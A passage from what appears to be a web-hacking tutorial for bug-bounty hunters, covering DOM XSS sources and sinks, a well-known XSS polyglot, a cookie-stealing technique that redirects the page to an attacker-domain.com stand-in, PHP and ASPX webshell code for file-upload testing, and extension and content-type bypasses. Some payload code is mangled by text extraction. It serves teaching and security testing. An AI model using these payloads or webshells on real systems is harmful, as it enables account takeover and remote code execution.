being   used   by   the   application.   A   list   of   javascript   sources   can   be   found   in   the   list   below:  
●
document.URL   
●
document.documentURI   
●
document.baseURI    
●
location   
●
location.href   
●
location.search   
●
location.hash   
●
Location.pathname  
●
Document.cookie  
This   is   not   a   list   of   all   the   sources   but   these   are   some   of   the   major   ones.   As   mentioned   
earlier   these   sources   can   be   modified   by   the   user   so   if  they   are   used   improperly   things   
could   go   wrong.  
Now   that   you   understand   how   to   find   the   user   input   (source)   you   need   to   figure   out   
where   it  is   being   used   in   the   application.   If   the   source   is   being   paced   to   a   dangerous   
sink   you   could   have   XSS.  
Sinks  
When   a   source   is   passed   to   a   dangerous   sink   in   javascript   it  is   possible   to   gain   code   
execution   within   the   clients   browser.    According   to   Google   “Sinks   are   meant   to   be   the   
points   in   the   flow   where   data   depending   from  sources   is   used   in   a   potentially   dangerous   
way   resulting   in   loss   of   Confidentiality,   Integrity   or   Availability   (the   CIA   triad)”.   A   list   of   
dangerous   sinks   can   be   found   below:  
Sink  
Example  
Eval  
eval(“Javascript   Code”   +   alert(0))  
Function  
function(“Javascript   Code”   +   alert(0))  
SetTimeout  
settimeout(“Javascript   Code”   +   alert(0),1)  
SetInterval  
setinterval(“Javascript   Code”   +   alert(0),1)  
Document.write  
document.write("html"+   “alert(0)’   or   you   have   to   break   out   of   a   div   tag   so   your   
payload   may   look   like   “   >”.   Maybe   the   vulnerability   is   in   an   
image   src   attribute   so   your   payload   looks   like   “javascript:alert(0)”   or   maybe   it's   a   DOM   
based   vulnerability   so   your   payload   would   just   be   “alert(0)”.    As   you   can   tell   the   basic   
“”   payload   is   going   to   miss   a   lot   of   things.   What   if  we   had   one   
payload   that   would   trigger   for   all   these   cases,   we   wouldn't   miss   anything.  
●
jaVasCript:/*-/*`/*\`/*'/*"/**/(/*  */oNcliCk=alert()   
)//%0D%0A%0d%0a//\x3csVg/\x3e  
The   example   shown   above   is   a   famous   XSS   polyglot   by    “0xsobky”   and   it  can   be   used   
to   trigger   your   xss  payload   on   a   multitude   of   scenarios.  
Beyond  the  alert  box  
Making   an   alert   box   appear   is   cool   and   all   but   it  doesnt   show   the   full   impact   of   an   XSS   
vulnerability.   Most   security   folks   know   when   you   get   a   XSS   POC   and   it  pops   an   alert   
box   that   there   is   something   dangerous   going   on.   However,   some   individuals   see   an   
alert   box   pop   and   think   “who   cares”.   If   you   are   unfamiliar   with   XSS   you   might   dismiss   
the   alert   box   as   nothing   when   in   reality   XSS   can   do   much   more.   As   a   security   
professional   it's   your   job   to   convey   the   impact   of   a   vulnerability.   
Cookie   Stealer  
Depending   on   the   application,   cookies   are   used   to   store   a   user's   authentication   details.   
When   a   user   logs   into   an   application   the   server   will   add   a   cookie   to   the   users   browser.   
Whenever   the   application   needs   to   verify   the   user's   identity   it  will   use   the   cookie   it  set   
previously   and   check   its  value   to   see   who   the   user   is   and   what   permissions   they   have.   If   
an   attacker   steals   this   cookie   they   will   be   able   to   impersonate   the   victim   giving   them   
access   to   their   account.  
Javascript   can   be   used   to   retrieve   a   users   cookies   as   shown   below:  
●
Document.cookie  
Now   that   we   have   a   way   of   retrieving   the   user's   cookie   we   need   a   way   to   send   it  to   the   
attacker's   machine.   Lucky   for   us   this   step   can   also   be   accomplished   utilizing   javascript.   
By   modifying   the   “document.location”   we   can   force   the   browser   to   navigate   to   an   
attackers   webpage   as   shown   below   :  
●
Document.location   =   ” http://attacker-domain.com ”  
Finally,   we   just   have   to   combine   these   two   commands   to   grab   the   victims   cookies   and   
send   them   to   the   attackers   machine.   This   can   be   done   with   the   following   POC   shown   
below:  
●
As   you   can   see   above   when   the   payload   was   executed   it  sent   the   users   cookie   to   our   
server.   As   an   attacker   we   could   use   this   cookie   to   login   as   the   victim   user   allowing   us   to   
fully   compromise   their   account.  
Summary  
Cross   site   scripting(XSS)   is   one   of   the   oldest   and   most   prevalent   types   of   vulnerability   
impacting   web   applications.   If   you   only   knew   how   to   exploit   XSS   you   would   still   be   able   
to   make   a   decent   amount   of   cash   from  bug   bounties   as   this   is   the   number   one   
vulnerability   found.   There   are   three   types   of   XSS   vulnerabilities   reflected,stored,   and   
DOM.   Reflected   and   stored   XSS   are   very   similar.   The   only   difference   is   that   one   will   
persist   in   the   application   while   the   other   won’t.   DOM   XSS   is   fairly   different   compared   to   
reflected   and   stored   XSS   as   everything   happens   in   the   victim's   browser   and   you   have   to   
be   on   the   lookout   for   sources   and   sinks.   Testing   for   XSS   can   also   be   a   challenge   since   
there   are   so   many   possible   scenarios.   To   combat   this   a   polyglot   XSS   payload   can   be   
used   which   will   allow   you   to   exploit   multiple   different   scenarios.   Finally   when   attempting   
to   show   the   impact   of   your   finding   try   to   stay   away   from  the   typical   alert   box   payload.   
Instead   try   stealing   the   users   cookies   for   account   takeover,   this   will   demonstrate   the   
impact   of   this   vulnerability   much   better   than   popping   an   alert   box.  
File  Upload  
Introduction  
File   upload   vulnerabilities   aren't   as   common   as   they   once   were   but   that   doesn't   mean   
you   won't   see   it  from  time   to   time.   As   you   are   aware,   web   applications   sometimes   let   
users   upload   file   files   to   their   site.   This   can   be   in   the   form  of   a   profile   picture,   pdf   upload   
functionality,   or   whatever.   If   done   improperly   attackers   can   upload   malicious   files   
potentially   gaining   remote   code   execution(RCE).   If   there   is   an   upload   feature   you   
should   be   testing   for   this   vulnerability.  
File  Upload  
One   of   the   first   things   I   do   when   testing   file   upload   functionalities   is   to   upload   a   simple   
cmd   backdoor.   Depending   on   the   language   of   the   target   web   application   your   back   door   
will   look   different,   below   are   some   examples:  
Language  
Code  
PHP  
";   $cmd   =   ($_REQUEST['cmd']);   
system($cmd);   echo   "";   die;   }?>  
ASPX  
void  
Page_Load(object   sender,   EventArgs   
e){}string   ExcuteCmd(string   
arg){ProcessStartInfo   psi   =   new  
ProcessStartInfo();psi.FileName   =   
"cmd.exe";psi.Arguments   =   "/c   
"+arg;psi.RedirectStandardOutput   =   
true;psi.UseShellExecute   =   false;Process   
p   =   Process.Start(psi);StreamReader   
stmrdr   =   p.StandardOutput;string   s  =   
stmrdr.ReadToEnd();stmrdr.Close();return   
s;}void   cmdExe_Click(object   sender,   
System.EventArgs   
e){Response.Write("");Response.W 
rite(Server.HtmlEncode(ExcuteCmd(txtAr 
g.Text)));Response.Write("");}awen   asp.net   
webshellCommand:  
Nowe   that   the   webshell   is   uploaded   we   need   to   figure   out   where   it's   uploaded   to.   Once   
you   figure   this   out   you   can   navigate   to   the   backdoor   and   execute   any   shell   command   
you   want   as   shown   below:  
As   you   can   see   above   the   shell   successfully   uploaded   and   we   were   able   to   execute   
remote   commands.   
Content  Type  Bypass  
Content   type   validation   is   when   the   server   validates   the   content   of   the   file   by   checking   
the   MIME   type   of   the   file,   which   can   be   found   in   the   http   request.  
As   we   can   see   the   above   image   clearly   states   the   file   has   a   Content-Type   of   
“application/x-php”.   However,   if  we   try   to   upload   the   file   it  will   be   blocked   because   that   
content   type   is   not   allowed   to   be   uploaded.   Uploading   images   is   allowed   though.   If   the   
server   trusts   the   content-type   in   the   HTTP   request   an   attacker   could   change   this   value   
to   “image/jpeg”   which   would   pass   the   validation.   
This   passes   the   content-type   validation   check   and   allows   us   to   upload   our   malicious   
PHP   payload.  
File  Name  Bypass  
Sometimes   the   server   will   check   the   file   name   to   see   if  it  is   blacklisted   or   white   listed.   As   
you   might   know   from  other   vulnerabilities   this   approach   to   defense   has   many   flaws.  
The   issue   with   black   listing   is   that   if  you   forget   even   1   extension   attackers   can   bypass   
the   validation.   To   implement   this   check   most   developers   will   use   a   regex   to   check   the   
file   extension.  
As   shown   above   we   were   able   to   bypass   the   regex   validation   by   changing   the   extension   
to   “phpt”   and   “phtml”.   Most   people   don’t   know   about   these   extensions   and   that   they   can   
be   used   to   execute   PHP   files.    The   developer   only   has   to   be   missing   one   extension   
from  the   validation   check   and   we   can   bypass   it.  
Summary  
File   upload   vulnerabilities   may   be   a   little   harder   to   find   in   the   wild   since   most   people   are   
aware   of   this   bug   but   if  you   do   find   this   vulnerability   it  almost   always   leads   to   remote   
code   execution   (RCE).   For  this   reason   alone   you   should   always   check   for   this   
vulnerability   whenever   you   see   the   ability   to   upload   files   to   an   application.  
Directory  Traversal  
Introduction  
Directory   traversal   is   a   vulnerability   that   occurs   when   developers   improperly   use   user   
supplied   input   to   fetch   files   from  the   operating   system.   As   you   may   know   the   “../”   
characters   will   traverse   back   one   directory   so   if  this   string   is   used   to   retrieve   files   you   